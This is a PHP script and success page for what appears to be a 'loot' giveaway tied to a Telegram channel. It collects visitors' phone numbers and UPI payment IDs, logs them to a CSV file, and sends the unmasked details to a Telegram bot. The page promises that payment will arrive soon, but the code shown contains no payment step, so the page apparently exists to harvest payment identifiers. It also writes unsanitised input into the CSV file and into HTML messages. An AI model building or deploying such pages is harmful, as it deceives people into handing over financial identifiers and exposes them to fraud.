<?php
include "config.php";

// Get form data
$phone = $_POST['phone'] ?? 'N/A';
$upi_id = $_POST['upi_id'] ?? 'N/A';
$time = date("Y-m-d H:i:s");
$claim = "₹".$claim_amount;

// Validate UPI ID
if(strpos($upi_id,'@') === false){
    http_response_code(400);
    exit("⚠ Invalid UPI ID. It must contain '@'");
}

// Check total claims & duplicates
$total_claims = 0;
$already_claimed = false;

if(file_exists($csv_file)){
    $data = array_map('str_getcsv', file($csv_file));
    if(!empty($data) && $data[0][0]==='Phone') $total_claims = count($data)-1;
    else $total_claims = count($data);

    foreach($data as $row){
        if(isset($row[0]) && trim($row[0])===trim($phone) || isset($row[1]) && trim($row[1])===trim($upi_id)){
            $already_claimed = true;
            break;
        }
    }
}

if($already_claimed){
    http_response_code(400);
    exit("⚠ 1 UPI/Phone 1 Time! Try another UPI or phone.");
}

if($total_claims >= $total_claim_limit){
    http_response_code(400);
    exit("⚠ Claim Limit Reached! Total Claims: $total_claims / $total_claim_limit");
}

// Save CSV
$f = fopen($csv_file,'a');
fputcsv($f, [$phone,$upi_id,$claim,$time]);
fclose($f);

// Mask for channel
$masked_upi = preg_replace('/.(?=.{3})/','*',$upi_id);
$masked_phone = preg_replace('/.(?=.{3})/','*',$phone);

// Telegram function
function sendTelegram($token,$chat_id,$message){
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $params = ['chat_id'=>$chat_id,'text'=>$message,'parse_mode'=>'HTML'];
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$params);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_exec($ch);
    curl_close($ch);
}

// Full data to bot
$bot_msg = "📱 Phone: $phone\n📌 UPI: $upi_id\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: ".($total_claims+1);
sendTelegram($telegram_bot_token,$chat_id,$bot_msg);

// Masked data to channel
$channel_msg = "📱 Phone: $masked_phone\n📌 UPI: $masked_upi\n💰 Claim: $claim\n🕒 Time: $time\n📍 Total Claims: ".($total_claims+1);
sendTelegram($telegram_bot_token,$channel_chat_id,$channel_msg);

// Redirect success
header("Refresh:3; url=https://t.me/EARNPAYTMLOOT0");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Success</title>
<style>
body{margin:0;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f1722,#0b3b2e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{background:rgba(0,0,0,0.85);padding:50px;border-radius:20px;width:100%;max-width:700px;text-align:center;box-shadow:0 10px 50px rgba(0,0,0,0.7);}
h1{color:#2ecc71;font-size:60px;margin-bottom:25px;}
p{font-size:22px;margin:10px 0;line-height:1.5;color:#f1c40f;font-weight:700;}
</style>
</head>
<body>
<div class="container">
<h1>✅ Submitted Successfully!</h1>
<p>Payment will be received soon. If you do not enter same UPI linked with same bank account 🤑🤑🤑</p>
<p>Total Claims So Far: <?php echo $total_claims+1; ?> / <?php echo $total_claim_limit; ?></p>
</div>
</body>
</html>